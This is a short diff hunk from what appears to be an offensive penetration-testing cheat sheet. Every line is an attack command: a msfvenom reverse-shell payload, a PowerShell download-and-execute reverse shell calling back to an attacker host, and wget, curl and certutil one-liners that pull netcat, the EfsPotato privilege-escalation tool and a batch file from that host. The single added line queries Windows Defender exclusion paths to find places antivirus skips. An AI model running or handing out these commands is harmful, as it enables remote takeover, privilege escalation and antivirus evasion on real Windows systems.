@@ -1216,6 +1216,7 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shel
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5555"
 
 [*] File Transfer
+reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
 wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe; wget http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe; wget http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
 curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe; curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe; curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
 certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe; certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPotato.exe; certutil -urlcache -f http://$MYIP:8888/bat2exe.bat \programdata\bat2exe.bat
